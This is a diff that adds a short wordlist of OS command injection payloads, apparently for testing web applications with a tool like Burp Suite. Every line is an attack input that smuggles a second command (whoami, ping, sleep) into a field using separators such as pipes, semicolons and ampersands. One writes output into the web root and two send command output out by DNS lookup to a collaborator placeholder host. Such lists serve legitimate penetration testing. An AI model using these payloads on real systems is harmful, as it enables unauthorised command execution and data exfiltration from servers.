@@ -1,0 +1,11 @@
+|whoami
+&&whoami
+;whoami
+;whoami;
+||ping+-c+10+127.0.0.1||
+||whoami||
+||whoami>/var/www/images/output.txt||
+||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+& ping -c 10 127.0.0.1 &
+||sleep+10||
